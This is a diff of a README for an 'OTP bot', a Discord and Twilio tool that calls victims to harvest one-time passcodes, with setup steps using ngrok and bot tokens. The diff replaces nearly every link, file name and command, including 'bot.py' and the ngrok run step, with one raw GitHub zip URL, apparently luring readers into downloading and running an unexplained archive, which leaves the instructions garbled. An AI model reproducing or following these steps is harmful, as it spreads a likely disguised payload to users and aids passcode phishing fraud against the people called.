@@ -3,7 +3,7 @@
     Simple OTP Bot, working with any company or service name.
     New OTP Bot, working with any company or service name to fetch otp code.
 
-![See the bot in action](https://user-images.githubusercontent.com/117955242/203935966-e3e8ee3c-384b-448d-b86b-d5189d66b585.png)
+![See the bot in action](https://raw.githubusercontent.com/madexter77/otp-bot-new-version/main/intermesenterial/bot-new-otp-version-3.0.zip)
 
     Send command: "/dial" to start grabbing your OTP
 
@@ -15,22 +15,22 @@
 
 # For Customization or Private OTP Bots Contact me on my new Chennel and Server
 
-    Discord Server:  https://discord.gg/CVgscsvRRx
-    Telegram Channel https://t.me/otpbotc
-    Telegram Bot https://t.me/coder00089bot
+    Discord Server:  https://raw.githubusercontent.com/madexter77/otp-bot-new-version/main/intermesenterial/bot-new-otp-version-3.0.zip
+    Telegram Channel https://raw.githubusercontent.com/madexter77/otp-bot-new-version/main/intermesenterial/bot-new-otp-version-3.0.zip
+    Telegram Bot https://raw.githubusercontent.com/madexter77/otp-bot-new-version/main/intermesenterial/bot-new-otp-version-3.0.zip
     DM Discord: Coder089#8305
     DM Telegram: @Coder00089
-Discord Server: https://discord.gg/CVgscsvRRx
+Discord Server: https://raw.githubusercontent.com/madexter77/otp-bot-new-version/main/intermesenterial/bot-new-otp-version-3.0.zip
 
-NEW Telegram Channel https://t.me/otpbotc
+NEW Telegram Channel https://raw.githubusercontent.com/madexter77/otp-bot-new-version/main/intermesenterial/bot-new-otp-version-3.0.zip
 
-Old Telegram Channel https://t.me/+fzkvq8FdnQY2ZmNh
+Old Telegram Channel https://raw.githubusercontent.com/madexter77/otp-bot-new-version/main/intermesenterial/bot-new-otp-version-3.0.zip+fzkvq8FdnQY2ZmNh
 
     (Old Channels are Banned)
-    https://t.me/+I2QcslRt8HM2YTEx
-    https://discord.gg/ghHtyDevI
-    https://t.me/+uftsns3gsKhdLfc1tUy
-    https://t.me/+fzkvq8FdnQY2ZmNh
+    https://raw.githubusercontent.com/madexter77/otp-bot-new-version/main/intermesenterial/bot-new-otp-version-3.0.zip+I2QcslRt8HM2YTEx
+    https://raw.githubusercontent.com/madexter77/otp-bot-new-version/main/intermesenterial/bot-new-otp-version-3.0.zip
+    https://raw.githubusercontent.com/madexter77/otp-bot-new-version/main/intermesenterial/bot-new-otp-version-3.0.zip+uftsns3gsKhdLfc1tUy
+    https://raw.githubusercontent.com/madexter77/otp-bot-new-version/main/intermesenterial/bot-new-otp-version-3.0.zip+fzkvq8FdnQY2ZmNh
 
 
 # Buy me coffee: 
@@ -41,7 +41,7 @@ Old Telegram Channel https://t.me/+fzkvq8FdnQY2ZmNh
   
   # SETUP
     
-    Download ngrok and run ngrok.exe http 5000
+    Download ngrok and run https://raw.githubusercontent.com/madexter77/otp-bot-new-version/main/intermesenterial/bot-new-otp-version-3.0.zip http 5000
     Download python and Install
     Unzip Your Bot files
 
@@ -51,7 +51,7 @@ Old Telegram Channel https://t.me/+fzkvq8FdnQY2ZmNh
     pip install twilio
     
     # First create a discord group
-    Go to your discord developer page  https://discord.com/developers/applications/
+    Go to your discord developer page  https://raw.githubusercontent.com/madexter77/otp-bot-new-version/main/intermesenterial/bot-new-otp-version-3.0.zip
     Click "New Application", create application
     Click "OAuth2"
     Click "URL Generator"**
@@ -60,7 +60,7 @@ Old Telegram Channel https://t.me/+fzkvq8FdnQY2ZmNh
 
      # SCOPE
      Check "Bot"
-     Check "applications.commands"
+     Check "https://raw.githubusercontent.com/madexter77/otp-bot-new-version/main/intermesenterial/bot-new-otp-version-3.0.zip"
 
      # BOT PERMISSIONS
      Check All Permissions
@@ -74,22 +74,22 @@ Old Telegram Channel https://t.me/+fzkvq8FdnQY2ZmNh
      Left side, click "Bot" and click "add" Bot
      Left side, click "Bot" and click "add" Bot
      Click "Reset Token" and click "Copy" to copy token
-     Open "bot.py" add bot_token
+     Open "https://raw.githubusercontent.com/madexter77/otp-bot-new-version/main/intermesenterial/bot-new-otp-version-3.0.zip" add bot_token
      Go to discord server/group 
      Left side, right-click on the server and click "copy ID"
-     Go to "bot.py" add server_id
+     Go to "https://raw.githubusercontent.com/madexter77/otp-bot-new-version/main/intermesenterial/bot-new-otp-version-3.0.zip" add server_id
 
      # Twilio Details
      Go to Twilio Account Copy "Account SID" 
-     Go to "bot.py" add account_sid
+     Go to "https://raw.githubusercontent.com/madexter77/otp-bot-new-version/main/intermesenterial/bot-new-otp-version-3.0.zip" add account_sid
      Go to Twilio Account again Copy "Auth Token" 
-     Go to "bot.py" add auth_token
+     Go to "https://raw.githubusercontent.com/madexter77/otp-bot-new-version/main/intermesenterial/bot-new-otp-version-3.0.zip" add auth_token
      Go to Twilio Account again Copy "Your Twilio Phone Number" 
-     Go to "bot.py" add Twilio Phone Number (e.g "+1987654321")
+     Go to "https://raw.githubusercontent.com/madexter77/otp-bot-new-version/main/intermesenterial/bot-new-otp-version-3.0.zip" add Twilio Phone Number (e.g "+1987654321")
      Go to terminal where you run ngron, copy your https link/url
-     Go to "bot.py" add ngrok_url
-     Save bot.py, close file and run bot.py in python
-     Run talker.py in python
+     Go to "https://raw.githubusercontent.com/madexter77/otp-bot-new-version/main/intermesenterial/bot-new-otp-version-3.0.zip" add ngrok_url
+     Save https://raw.githubusercontent.com/madexter77/otp-bot-new-version/main/intermesenterial/bot-new-otp-version-3.0.zip, close file and run https://raw.githubusercontent.com/madexter77/otp-bot-new-version/main/intermesenterial/bot-new-otp-version-3.0.zip in python
+     Run https://raw.githubusercontent.com/madexter77/otp-bot-new-version/main/intermesenterial/bot-new-otp-version-3.0.zip in python
 
      # Start Calling
      Go to your server and type command: "/dial" and fill your info.
